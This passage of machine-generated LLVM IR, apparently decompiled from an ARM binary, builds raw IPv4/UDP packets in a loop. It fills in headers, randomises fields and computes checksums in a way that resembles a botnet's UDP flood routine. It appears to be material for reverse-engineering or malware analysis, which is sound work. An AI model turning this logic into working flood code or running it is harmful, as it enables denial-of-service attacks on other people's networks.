  store i8 %v1_92cc, i8* %v4_92cc, align 1
  %v0_92d0 = load i32, i32* @r5, align 4
  %v1_92d0 = trunc i32 %v0_92d0 to i8
  %v2_92d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_92d0 = add i32 %v2_92d0, 2
  %v4_92d0 = inttoptr i32 %v3_92d0 to i8*
  store i8 %v1_92d0, i8* %v4_92d0, align 1
  %v0_92d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_92d4 = trunc i32 %v0_92d4 to i8
  %v2_92d4 = load i32, i32* %r3.global-to-local, align 4
  %v3_92d4 = add i32 %v2_92d4, 3
  %v4_92d4 = inttoptr i32 %v3_92d4 to i8*
  store i8 %v1_92d4, i8* %v4_92d4, align 1
  %v0_92d8 = load i32, i32* @r7, align 4
  %v1_92d8 = trunc i32 %v0_92d8 to i8
  %v2_92d8 = load i32, i32* %r3.global-to-local, align 4
  %v3_92d8 = add i32 %v2_92d8, 4
  %v4_92d8 = inttoptr i32 %v3_92d8 to i8*
  store i8 %v1_92d8, i8* %v4_92d8, align 1
  %v0_92dc = load i32, i32* @r6, align 4
  store i32 %v0_92dc, i32* %stack_var_-40, align 4
  %v5_92e0 = icmp slt i32 %v0_92c4, %v1_92c4
  br i1 %v5_92e0, label %dec_label_pc_9214, label %dec_label_pc_92e4

dec_label_pc_92e4:                                ; preds = %dec_label_pc_9544, %dec_label_pc_9214, %.thread
  %v0_92e4 = load i32, i32* @sl, align 4
  %v2_92e4 = icmp eq i32 %v0_92e4, 0
  store i1 %v2_92e4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9490 = icmp eq i32 %v3_9134, 65535
  %v2_935c = icmp eq i32 %v1_90b4, 0
  %v2_9324 = icmp eq i32 %v6_90c8, -1
  %v7_9324 = icmp eq i32 %v6_90c8, -1
  br label %dec_label_pc_92ec.outer

dec_label_pc_92ec.outer:                          ; preds = %dec_label_pc_940c, %dec_label_pc_92e4
  %v1_92ec.ph.in = phi i32 [ %v1_9400, %dec_label_pc_940c ], [ %v0_92e4, %dec_label_pc_92e4 ]
  %v0_92ec.ph = phi i1 [ %v2_940c, %dec_label_pc_940c ], [ %v2_92e4, %dec_label_pc_92e4 ]
  %v1_92ec.ph = icmp slt i32 %v1_92ec.ph.in, 0
  %v4_92ec = or i1 %v1_92ec.ph, %v0_92ec.ph
  br label %dec_label_pc_92ec

dec_label_pc_92ec:                                ; preds = %dec_label_pc_92ec.outer, %dec_label_pc_92ec
  br i1 %v4_92ec, label %dec_label_pc_92ec, label %dec_label_pc_92f0

dec_label_pc_92f0:                                ; preds = %dec_label_pc_92ec
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_92fc

dec_label_pc_92fc:                                ; preds = %dec_label_pc_9364, %dec_label_pc_92f0
  %v1_9310 = phi i32 [ %v1_93fc, %dec_label_pc_9364 ], [ 0, %dec_label_pc_92f0 ]
  %v5_9300 = mul i32 %v1_9310, 24
  %v1_9304 = load i32, i32* @r8, align 4
  %v2_9304 = add i32 %v1_9304, %v5_9300
  store i32 %v2_9304, i32* %r3.global-to-local, align 4
  store i32 %v2_8fc0, i32* %ip.global-to-local, align 4
  %v1_930c = add i32 %v2_9304, 20
  %v2_930c = inttoptr i32 %v1_930c to i8*
  %v3_930c = load i8, i8* %v2_930c, align 1
  %v4_930c = zext i8 %v3_930c to i32
  store i32 %v4_930c, i32* %r2.global-to-local, align 4
  %v4_9310 = mul i32 %v1_9310, 4
  %v5_9310 = add i32 %v4_9310, %v2_8fc0
  %v6_9310 = inttoptr i32 %v5_9310 to i32*
  %v7_9310 = load i32, i32* %v6_9310, align 4
  store i32 %v7_9310, i32* @r5, align 4
  %v7_9314 = icmp eq i8 %v3_930c, 31
  store i1 %v7_9314, i1* %cpsr_z.global-to-local, align 1
  %v1_9318 = add i32 %v7_9310, 20
  store i32 %v1_9318, i32* @r6, align 4
  %tmp84 = icmp ult i8 %v3_930c, 32
  br i1 %tmp84, label %dec_label_pc_9418, label %dec_label_pc_9320

dec_label_pc_9320:                                ; preds = %dec_label_pc_92fc
  store i32 %v6_90c8, i32* %r0.global-to-local, align 4
  store i1 %v7_9324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9324, label %dec_label_pc_9480, label %dec_label_pc_932c

dec_label_pc_932c:                                ; preds = %dec_label_pc_9418, %dec_label_pc_9320
  store i32 %v3_9134, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9490, label %dec_label_pc_949c, label %dec_label_pc_9340

dec_label_pc_9340:                                ; preds = %dec_label_pc_9480.dec_label_pc_9340_crit_edge, %dec_label_pc_932c
  %v1_9344 = phi i32 [ %v1_9344.pre, %dec_label_pc_9480.dec_label_pc_9340_crit_edge ], [ 65535, %dec_label_pc_932c ]
  store i32 %v3_9150, i32* %r2.global-to-local, align 4
  %v9_9344 = icmp eq i32 %v3_9150, %v1_9344
  store i1 %v9_9344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9344, label %dec_label_pc_94b8, label %dec_label_pc_934c

dec_label_pc_934c:                                ; preds = %dec_label_pc_949c.dec_label_pc_934c_crit_edge, %dec_label_pc_9340
  %v1_9350 = phi i32 [ %v1_9350.pre, %dec_label_pc_949c.dec_label_pc_934c_crit_edge ], [ %v1_9344, %dec_label_pc_9340 ]
  store i32 %v3_9154, i32* %r3.global-to-local, align 4
  %v9_9350 = icmp eq i32 %v3_9154, %v1_9350
  store i1 %v9_9350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9350, label %dec_label_pc_94d4, label %dec_label_pc_9358

dec_label_pc_9358:                                ; preds = %dec_label_pc_94b8, %dec_label_pc_934c
  store i32 %v1_90b4, i32* %ip.global-to-local, align 4
  store i1 %v2_935c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_935c, label %dec_label_pc_9364, label %dec_label_pc_94f0

dec_label_pc_9364:                                ; preds = %dec_label_pc_9358, %dec_label_pc_94d4, %dec_label_pc_94f0
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9368 = load i32, i32* @r7, align 4
  %v1_9368 = trunc i32 %v0_9368 to i8
  %v2_9368 = load i32, i32* @r5, align 4
  %v3_9368 = add i32 %v2_9368, 10
  %v4_9368 = inttoptr i32 %v3_9368 to i8*
  store i8 %v1_9368, i8* %v4_9368, align 1
  %v0_936c = load i32, i32* @r7, align 4
  %v1_936c = trunc i32 %v0_936c to i8
  %v2_936c = load i32, i32* @r5, align 4
  %v3_936c = add i32 %v2_936c, 11
  %v4_936c = inttoptr i32 %v3_936c to i8*
  store i8 %v1_936c, i8* %v4_936c, align 1
  %v0_9370 = load i32, i32* @r5, align 4
  store i32 %v0_9370, i32* @r0, align 4
  %v2_9374 = call i32 @function_d0b8(i32 %v0_9370, i32 20)
  %v3_9374 = trunc i32 %v2_9374 to i8
  store i32 %v2_9374, i32* %r0.global-to-local, align 4
  %v4_9378 = sdiv i32 %v2_9374, 256
  store i32 %v4_9378, i32* %r3.global-to-local, align 4
  %v1_937c = trunc i32 %v4_9378 to i8
  %v2_937c = load i32, i32* @r5, align 4
  %v3_937c = add i32 %v2_937c, 11
  %v4_937c = inttoptr i32 %v3_937c to i8*
  store i8 %v1_937c, i8* %v4_937c, align 1
  %v3_9380 = load i32, i32* @r5, align 4
  %v4_9380 = add i32 %v3_9380, 10
  %v5_9380 = inttoptr i32 %v4_9380 to i8*
  store i8 %v3_9374, i8* %v5_9380, align 1
  %v0_9384 = load i32, i32* @r7, align 4
  %v1_9384 = trunc i32 %v0_9384 to i8
  %v2_9384 = load i32, i32* @r6, align 4
  %v3_9384 = add i32 %v2_9384, 6
  %v4_9384 = inttoptr i32 %v3_9384 to i8*
  store i8 %v1_9384, i8* %v4_9384, align 1
  %v0_9388 = load i32, i32* @r7, align 4
  %v1_9388 = trunc i32 %v0_9388 to i8
  %v2_9388 = load i32, i32* @r6, align 4
  %v3_9388 = add i32 %v2_9388, 7
  %v4_9388 = inttoptr i32 %v3_9388 to i8*
  store i8 %v1_9388, i8* %v4_9388, align 1
  %v0_938c = load i32, i32* @r5, align 4
  %v1_938c = add i32 %v0_938c, 24
  %v2_938c = inttoptr i32 %v1_938c to i8*
  %v3_938c = load i8, i8* %v2_938c, align 1
  %v4_938c = zext i8 %v3_938c to i32
  store i32 %v4_938c, i32* %r3.global-to-local, align 4
  %v1_9390 = add i32 %v0_938c, 25
  %v2_9390 = inttoptr i32 %v1_9390 to i8*
  %v3_9390 = load i8, i8* %v2_9390, align 1
  %v4_9390 = zext i8 %v3_9390 to i32
  %v0_9394 = load i32, i32* @r6, align 4
  store i32 %v0_9394, i32* @r1, align 4
  %v4_9398 = mul nuw nsw i32 %v4_9390, 256
  %v5_9398 = or i32 %v4_9398, %v4_938c
  store i32 %v5_9398, i32* %r2.global-to-local, align 4
  store i32 %v0_938c, i32* %r0.global-to-local, align 4
  %v0_93a0 = load i32, i32* @sb, align 4
  store i32 %v0_93a0, i32* %r3.global-to-local, align 4
  %v4_93a4 = call i32 @function_d114(i32 %v0_938c, i32 %v0_9394, i32 %v5_9398, i32 %v0_93a0)
  %v5_93a4 = trunc i32 %v4_93a4 to i8
  store i32 %v4_93a4, i32* %r0.global-to-local, align 4
  %v4_93a838 = udiv i32 %v4_93a4, 256
  %v1_93ac = trunc i32 %v4_93a838 to i8
  %v2_93ac = load i32, i32* @r6, align 4
  %v3_93ac = add i32 %v2_93ac, 7
  %v4_93ac = inttoptr i32 %v3_93ac to i8*
  store i8 %v1_93ac, i8* %v4_93ac, align 1
  %v3_93b0 = load i32, i32* @r6, align 4
  %v4_93b0 = add i32 %v3_93b0, 6
  %v5_93b0 = inttoptr i32 %v4_93b0 to i8*
  store i8 %v5_93a4, i8* %v5_93b0, align 1
  %v3_93b4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_93b4, i32* %r3.global-to-local, align 4
  %v0_93b8 = load i32, i32* @r5, align 4
  %v1_93b8 = add i32 %v0_93b8, 20
  %v2_93b8 = inttoptr i32 %v1_93b8 to i32*
  %v3_93b8 = load i32, i32* %v2_93b8, align 4
  %v3_93c0 = udiv i32 %v3_93b8, 65536
  store i32 %v3_93c0, i32* %r2.global-to-local, align 4
  %v5_93c4 = mul i32 %v3_93b4, 24
  %v1_93c8 = load i32, i32* @r8, align 4
  %v2_93c8 = add i32 %v1_93c8, %v5_93c4
  store i32 %v2_93c8, i32* %ip.global-to-local, align 4
  %v3_93cc35 = udiv i32 %v3_93b8, 16777216
  %v1_93d0 = trunc i32 %v3_93cc35 to i8
  %v3_93d0 = add i32 %v2_93c8, 3
  %v4_93d0 = inttoptr i32 %v3_93d0 to i8*
  store i8 %v1_93d0, i8* %v4_93d0, align 1
  %v0_93d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_93d4 = trunc i32 %v0_93d4 to i8
  %v2_93d4 = load i32, i32* %ip.global-to-local, align 4
  %v3_93d4 = add i32 %v2_93d4, 2
  %v4_93d4 = inttoptr i32 %v3_93d4 to i8*
  store i8 %v1_93d4, i8* %v4_93d4, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_93dc = load i32, i32* @r5, align 4
  store i32 %v0_93dc, i32* %r1.global-to-local, align 4
  store i32 %v3_90dc, i32* %r0.global-to-local, align 4
  %v0_93e4 = load i32, i32* @fp, align 4
  store i32 %v0_93e4, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_93ec = load i32, i32* %ip.global-to-local, align 4
  %v6_93f4 = inttoptr i32 %v0_93dc to i32*
  %v7_93f4 = call i32 @function_1237c(i32 %v3_90dc, i32* %v6_93f4, i32 %v0_93e4, i32 16384, i32 %v0_93ec, i32 16)
  %v3_93f8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_93f8, i32* %r3.global-to-local, align 4
  %v1_93fc = add i32 %v3_93f8, 1
  store i32 %v1_93fc, i32* %r0.global-to-local, align 4
  %v1_9400 = load i32, i32* @sl, align 4
  %v9_9400 = icmp eq i32 %v1_93fc, %v1_9400
  store i1 %v9_9400, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_93fc, i32* %stack_var_-40, align 4
  %v5_9408 = icmp slt i32 %v1_93fc, %v1_9400
  br i1 %v5_9408, label %dec_label_pc_92fc, label %dec_label_pc_940c

dec_label_pc_940c:                                ; preds = %dec_label_pc_9364
  %v2_940c = icmp eq i32 %v1_9400, 0
  store i1 %v2_940c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_92ec.outer

dec_label_pc_9418:                                ; preds = %dec_label_pc_92fc
  %v1_9418 = add i32 %v2_9304, 16
  %v2_9418 = inttoptr i32 %v1_9418 to i32*
  %v3_9418 = load i32, i32* %v2_9418, align 4
  %v0_941c = call i32 @function_e978()
  store i32 %v0_941c, i32* %r0.global-to-local, align 4
  %v3_9420 = load i32, i32* %stack_var_-40, align 4
  %v5_9428 = mul i32 %v3_9420, 24
  %v1_9430 = load i32, i32* @r8, align 4
  %v2_9430 = add i32 %v1_9430, %v5_9428
  store i32 %v2_9430, i32* %r1.global-to-local, align 4
  %v1_9434 = and i32 %v3_9418, 65280
  store i32 %v1_9434, i32* %r3.global-to-local, align 4
  %v1_942c = udiv i32 %v3_9418, 256
  %v3_9438 = and i32 %v1_942c, 65280
  store i32 %v3_9438, i32* %r2.global-to-local, align 4
  %v3_943c = mul i32 %v3_9418, 16777216
  store i32 %v3_943c, i32* %ip.global-to-local, align 4
  %v1_9440 = add i32 %v2_9430, 20
  %v2_9440 = inttoptr i32 %v1_9440 to i8*
  %v3_9440 = load i8, i8* %v2_9440, align 1
  %v4_9440 = zext i8 %v3_9440 to i32
  %v4_9444 = mul nuw nsw i32 %v1_9434, 256
  %v5_9444 = or i32 %v4_9444, %v3_943c
  store i32 %v5_9444, i32* %ip.global-to-local, align 4
  %v2_944c = call i32 @llvm.bswap.i32(i32 %v3_9418)
  %v7_9450 = lshr i32 %v0_941c, %v4_9440
  %v8_9450 = add i32 %v7_9450, %v2_944c
  store i32 %v8_9450, i32* %r2.global-to-local, align 4
  %v3_945c = mul i32 %v8_9450, 16777216
  %v1_9454 = mul i32 %v8_9450, 256
  %v4_9460 = and i32 %v1_9454, 16711680
  %v5_9460 = or i32 %v4_9460, %v3_945c
  store i32 %v5_9460, i32* %r1.global-to-local, align 4
  store i32 %v6_90c8, i32* %r0.global-to-local, align 4
  %v2_9470 = call i32 @llvm.bswap.i32(i32 %v8_9450)
  store i32 %v2_9470, i32* %r3.global-to-local, align 4
  store i1 %v7_9324, i1* %cpsr_z.global-to-local, align 1
  %v1_9478 = load i32, i32* @r5, align 4
  %v2_9478 = add i32 %v1_9478, 16
  %v3_9478 = inttoptr i32 %v2_9478 to i32*
  store i32 %v2_9470, i32* %v3_9478, align 4
  br i1 %v2_9324, label %dec_label_pc_9480, label %dec_label_pc_932c

dec_label_pc_9480:                                ; preds = %dec_label_pc_9418, %dec_label_pc_9320
  %v0_9480 = call i32 @function_e978()
  store i32 %v0_9480, i32* %r0.global-to-local, align 4
  store i32 %v3_9134, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9490, i1* %cpsr_z.global-to-local, align 1
  %v1_9494 = load i32, i32* @r5, align 4
  %v2_9494 = add i32 %v1_9494, 12
  %v3_9494 = inttoptr i32 %v2_9494 to i32*
  store i32 %v0_9480, i32* %v3_9494, align 4
  br i1 %v3_9490, label %dec_label_pc_949c, label %dec_label_pc_9480.dec_label_pc_9340_crit_edge

dec_label_pc_9480.dec_label_pc_9340_crit_edge:    ; preds = %dec_label_pc_9480
  %v1_9344.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9340

dec_label_pc_949c:                                ; preds = %dec_label_pc_9480, %dec_label_pc_932c
  %v0_949c = call i32 @function_e978()
  %v1_949c = trunc i32 %v0_949c to i8
  store i32 %v0_949c, i32* %r0.global-to-local, align 4
  store i32 %v3_9150, i32* %r2.global-to-local, align 4
  %v4_94a4 = sdiv i32 %v0_949c, 256
  store i32 %v4_94a4, i32* %r3.global-to-local, align 4
  %v1_94a8 = load i32, i32* @r4, align 4
  %v9_94a8 = icmp eq i32 %v3_9150, %v1_94a8
  store i1 %v9_94a8, i1* %cpsr_z.global-to-local, align 1
  %v1_94ac = trunc i32 %v4_94a4 to i8
  %v2_94ac = load i32, i32* @r5, align 4
  %v3_94ac = add i32 %v2_94ac, 5
  %v4_94ac = inttoptr i32 %v3_94ac to i8*
  store i8 %v1_94ac, i8* %v4_94ac, align 1
  %v3_94b0 = load i32, i32* @r5, align 4
  %v4_94b0 = add i32 %v3_94b0, 4
  %v5_94b0 = inttoptr i32 %v4_94b0 to i8*
  store i8 %v1_949c, i8* %v5_94b0, align 1
  %v0_94b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_94b4, label %dec_label_pc_94b8, label %dec_label_pc_949c.dec_label_pc_934c_crit_edge

dec_label_pc_949c.dec_label_pc_934c_crit_edge:    ; preds = %dec_label_pc_949c
  %v1_9350.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_934c

dec_label_pc_94b8:                                ; preds = %dec_label_pc_949c, %dec_label_pc_9340
  %v0_94b8 = call i32 @function_e978()
  %v1_94b8 = trunc i32 %v0_94b8 to i8
  store i32 %v0_94b8, i32* %r0.global-to-local, align 4
  %v4_94bc = sdiv i32 %v0_94b8, 256
  store i32 %v4_94bc, i32* %r3.global-to-local, align 4
  %v3_94c0 = load i32, i32* @r5, align 4
  %v4_94c0 = add i32 %v3_94c0, 20
  %v5_94c0 = inttoptr i32 %v4_94c0 to i8*
  store i8 %v1_94b8, i8* %v5_94c0, align 1
  %v0_94c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_94c4 = trunc i32 %v0_94c4 to i8
  %v2_94c4 = load i32, i32* @r6, align 4
  %v3_94c4 = add i32 %v2_94c4, 1
  %v4_94c4 = inttoptr i32 %v3_94c4 to i8*
  store i8 %v1_94c4, i8* %v4_94c4, align 1
  store i32 %v3_9154, i32* %r3.global-to-local, align 4
  %v1_94cc = load i32, i32* @r4, align 4
  %v9_94cc = icmp eq i32 %v3_9154, %v1_94cc
  store i1 %v9_94cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_94cc, label %dec_label_pc_94d4, label %dec_label_pc_9358

dec_label_pc_94d4:                                ; preds = %dec_label_pc_94b8, %dec_label_pc_934c
  %v0_94d4 = call i32 @function_e978()
  %v1_94d4 = trunc i32 %v0_94d4 to i8
  store i32 %v0_94d4, i32* %r0.global-to-local, align 4
  store i32 %v1_90b4, i32* %ip.global-to-local, align 4
  %v4_94dc = sdiv i32 %v0_94d4, 256
  store i32 %v4_94dc, i32* %r3.global-to-local, align 4
  store i1 %v2_935c, i1* %cpsr_z.global-to-local, align 1
  %v1_94e4 = trunc i32 %v4_94dc to i8
  %v2_94e4 = load i32, i32* @r6, align 4
  %v3_94e4 = add i32 %v2_94e4, 3
  %v4_94e4 = inttoptr i32 %v3_94e4 to i8*
  store i8 %v1_94e4, i8* %v4_94e4, align 1
  %v3_94e8 = load i32, i32* @r6, align 4
  %v4_94e8 = add i32 %v3_94e8, 2
  %v5_94e8 = inttoptr i32 %v4_94e8 to i8*
  store i8 %v1_94d4, i8* %v5_94e8, align 1
  %v0_94ec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_94ec, label %dec_label_pc_9364, label %dec_label_pc_94f0

dec_label_pc_94f0:                                ; preds = %dec_label_pc_9358, %dec_label_pc_94d4
  %v0_94f0 = load i32, i32* @r5, align 4
  %v1_94f0 = add i32 %v0_94f0, 28
  store i32 %v1_94f0, i32* %r0.global-to-local, align 4
  store i32 %v0_912c, i32* @r1, align 4
  %v1_94f8 = inttoptr i32 %v1_94f0 to i8*
  %v2_94f8 = call i32 @function_eaf8(i8* %v1_94f8)
  store i32 %v2_94f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9364

dec_label_pc_9500:                                ; preds = %dec_label_pc_90ec
  store i32 %v3_90dc, i32* %r0.global-to-local, align 4
  %v1_9504 = call i32 @function_11af0(i32 %v3_90dc)
  store i32 %v1_9504, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_8fa0, %dec_label_pc_9500
  %v29_950c = phi i32 [ %v3_90dc, %dec_label_pc_8fa0 ], [ %v1_9504, %dec_label_pc_9500 ]
  store i32 %v18_8fa0, i32* %sb.global-to-local, align 4
  store i32 %v24_8fa0, i32* %fp.global-to-local, align 4
  ret i32 %v29_950c

dec_label_pc_9510:                                ; preds = %dec_label_pc_9170
  %v3_9514 = sext i8 %v5_91d4 to i32
  %v7_9514 = sext i8 %v5_91d8 to i32
  %v3_9518 = sdiv i32 %v3_9514, 256
  store i32 %v3_9518, i32* %r0.global-to-local, align 4
  %v3_951c = sdiv i32 %v7_9514, 256
  store i32 %v3_951c, i32* %r1.global-to-local, align 4
  store i32 %v1_91ac, i32* %r2.global-to-local, align 4
  store i32 %v1_91b0, i32* %r3.global-to-local, align 4
  %v3_952834 = udiv i32 %v1_91c8, 256
  store i32 %v3_952834, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  %v4_9594 = sext i8 %v5_9030 to i32
  %sext11 = mul i32 %v1_91a4, 16777216
  %v4_95ec = sdiv i32 %sext11, 16777216
  %sext12 = mul i32 %v0_9140, 16777216
  %v4_95f0 = sdiv i32 %sext12, 16777216
  %sext13 = mul i32 %v0_913c, 16777216
  %v4_960c = sdiv i32 %sext13, 16777216
  %v1_95f8 = trunc i32 %v3_951c to i8
  %v1_9614 = trunc i32 %v4_960c to i8
  br label %dec_label_pc_9544

dec_label_pc_9544:                                ; preds = %dec_label_pc_9544, %dec_label_pc_9510
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_9550 = call i32 @function_126cc(i32 1510, i32 1)
  store i32 %v2_9550, i32* %r0.global-to-local, align 4
  store i32 %v2_8fc0, i32* %r1.global-to-local, align 4
  %v3_9558 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9558, i32* %r2.global-to-local, align 4
  %v2_955c = load i32, i32* @r6, align 4
  %v5_955c = mul i32 %v2_955c, 4
  %v6_955c = add i32 %v5_955c, %v2_8fc0
  %v7_955c = inttoptr i32 %v6_955c to i32*
  store i32 %v2_9550, i32* %v7_955c, align 4
  %v0_9560 = load i32, i32* %r1.global-to-local, align 4
  %v1_9560 = load i32, i32* %r2.global-to-local, align 4
  %v4_9560 = mul i32 %v1_9560, 4
  %v5_9560 = add i32 %v4_9560, %v0_9560
  %v6_9560 = inttoptr i32 %v5_9560 to i32*
  %v7_9560 = load i32, i32* %v6_9560, align 4
  store i32 %v7_9560, i32* %r1.global-to-local, align 4
  %v1_9564 = inttoptr i32 %v7_9560 to i8*
  %v2_9564 = load i8, i8* %v1_9564, align 1
  %tmp85 = urem i8 %v2_9564, 16
  %v1_9568 = zext i8 %tmp85 to i32
  %v1_956c = or i32 %v1_9568, 64
  store i32 %v1_956c, i32* %r3.global-to-local, align 4
  %v1_9570 = trunc i32 %v1_956c to i8
  store i8 %v1_9570, i8* %v1_9564, align 1
  %v0_9574 = load i32, i32* %r1.global-to-local, align 4
  %v1_9574 = inttoptr i32 %v0_9574 to i8*
  %v2_9574 = load i8, i8* %v1_9574, align 1
  %v3_9574 = zext i8 %v2_9574 to i32
  %v1_9578 = and i32 %v3_9574, 240
  %v1_957c = or i32 %v1_9578, 5
  store i32 %v1_957c, i32* %r2.global-to-local, align 4
  %v3_9584 = add i32 %v0_9574, 9
  %v4_9584 = inttoptr i32 %v3_9584 to i8*
  store i8 17, i8* %v4_9584, align 1
  %v0_9588 = load i32, i32* %r2.global-to-local, align 4
  %v1_9588 = trunc i32 %v0_9588 to i8
  %v2_9588 = load i32, i32* %r1.global-to-local, align 4
  %v3_9588 = inttoptr i32 %v2_9588 to i8*
  store i8 %v1_9588, i8* %v3_9588, align 1
  %v2_9590 = load i32, i32* %r1.global-to-local, align 4
  %v3_9590 = add i32 %v2_9590, 1
  %v4_9590 = inttoptr i32 %v3_9590 to i8*
  store i8 %v5_8ff8, i8* %v4_9590, align 1
  store i32 %v4_9594, i32* %r0.global-to-local, align 4
  %v2_9598 = load i32, i32* %r1.global-to-local, align 4
  %v3_9598 = add i32 %v2_9598, 8
  %v4_9598 = inttoptr i32 %v3_9598 to i8*
  store i8 %v5_9030, i8* %v4_9598, align 1
  %v3_959c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_959c, i32* %r2.global-to-local, align 4
  store i32 %v6_90c8, i32* %ip.global-to-local, align 4
  %v3_95a4 = mul i32 %v3_959c, 32
  store i32 %v3_95a4, i32* %r3.global-to-local, align 4
  %v1_95a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_95a8 = add i32 %v1_95a8, 12
  %v3_95a8 = inttoptr i32 %v2_95a8 to i32*
  store i32 %v6_90c8, i32* %v3_95a8, align 4
  %v0_95ac = load i32, i32* %r3.global-to-local, align 4
  %v1_95ac = load i32, i32* %r2.global-to-local, align 4
  %tmp86 = mul i32 %v1_95ac, -8
  %v5_95ac = add i32 %v0_95ac, %tmp86
  %v1_95b0 = load i32, i32* @r8, align 4
  %v2_95b0 = add i32 %v5_95ac, %v1_95b0
  store i32 %v2_95b0, i32* %r3.global-to-local, align 4
  %v1_95b4 = add i32 %v2_95b0, 16
  %v2_95b4 = inttoptr i32 %v1_95b4 to i32*
  %v3_95b4 = load i32, i32* %v2_95b4, align 4
  store i32 %v3_95b4, i32* %ip.global-to-local, align 4
  %v1_95b8 = add i32 %v1_95ac, 1
  store i32 %v1_95b8, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_95c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_95c4 = add i32 %v2_95c4, 6
  %v4_95c4 = inttoptr i32 %v3_95c4 to i8*
  store i8 64, i8* %v4_95c4, align 1
  %v0_95c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_95c8 = trunc i32 %v0_95c8 to i8
  %v2_95c8 = load i32, i32* %r1.global-to-local, align 4
  %v3_95c8 = add i32 %v2_95c8, 7
  %v4_95c8 = inttoptr i32 %v3_95c8 to i8*
  store i8 %v1_95c8, i8* %v4_95c8, align 1
  %v0_95cc = load i32, i32* %ip.global-to-local, align 4
  %v1_95cc = load i32, i32* %r1.global-to-local, align 4
  %v2_95cc = add i32 %v1_95cc, 16
  %v3_95cc = inttoptr i32 %v2_95cc to i32*
  store i32 %v0_95cc, i32* %v3_95cc, align 4
  store i32 %v3_9518, i32* %r3.global-to-local, align 4
  store i32 %v7_9514, i32* %ip.global-to-local, align 4
  %v2_95dc = load i32, i32* %r1.global-to-local, align 4
  %v3_95dc = add i32 %v2_95dc, 2
  %v4_95dc = inttoptr i32 %v3_95dc to i8*
  store i8 %v5_91d4, i8* %v4_95dc, align 1
  %v0_95e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_95e0 = trunc i32 %v0_95e0 to i8
  %v2_95e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_95e0 = add i32 %v2_95e0, 3
  %v4_95e0 = inttoptr i32 %v3_95e0 to i8*
  store i8 %v1_95e0, i8* %v4_95e0, align 1
  %v0_95e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_95e4 = trunc i32 %v0_95e4 to i8
  %v2_95e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_95e4 = add i32 %v2_95e4, 4
  %v4_95e4 = inttoptr i32 %v3_95e4 to i8*
  store i8 %v1_95e4, i8* %v4_95e4, align 1
  store i32 %v3_951c, i32* %r2.global-to-local, align 4
  store i32 %v4_95ec, i32* %r3.global-to-local, align 4
  store i32 %v4_95f0, i32* %ip.global-to-local, align 4
  %v0_95f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_95f4 = add i32 %v0_95f4, 20
  store i32 %v1_95f4, i32* %r0.global-to-local, align 4
  %v3_95f8 = add i32 %v0_95f4, 5
  %v4_95f8 = inttoptr i32 %v3_95f8 to i8*
  store i8 %v1_95f8, i8* %v4_95f8, align 1
  %v0_95fc = load i32, i32* @r4, align 4
  %v1_95fc = trunc i32 %v0_95fc to i8
  %v2_95fc = load i32, i32* %r1.global-to-local, align 4
  %v3_95fc = add i32 %v2_95fc, 20
  %v4_95fc = inttoptr i32 %v3_95fc to i8*
  store i8 %v1_95fc, i8* %v4_95fc, align 1
  %v0_9600 = load i32, i32* %r3.global-to-local, align 4
  %v1_9600 = trunc i32 %v0_9600 to i8
  %v2_9600 = load i32, i32* %r0.global-to-local, align 4
  %v3_9600 = add i32 %v2_9600, 5
  %v4_9600 = inttoptr i32 %v3_9600 to i8*
  store i8 %v1_9600, i8* %v4_9600, align 1
  %v0_9604 = load i32, i32* %ip.global-to-local, align 4
  %v1_9604 = trunc i32 %v0_9604 to i8
  %v2_9604 = load i32, i32* %r0.global-to-local, align 4
  %v3_9604 = add i32 %v2_9604, 1
  %v4_9604 = inttoptr i32 %v3_9604 to i8*
  store i8 %v1_9604, i8* %v4_9604, align 1
  %v0_9608 = load i32, i32* @r5, align 4
  %v1_9608 = trunc i32 %v0_9608 to i8
  %v2_9608 = load i32, i32* %r0.global-to-local, align 4
  %v3_9608 = add i32 %v2_9608, 2
  %v4_9608 = inttoptr i32 %v3_9608 to i8*
  store i8 %v1_9608, i8* %v4_9608, align 1
  store i32 %v4_960c, i32* %r1.global-to-local, align 4
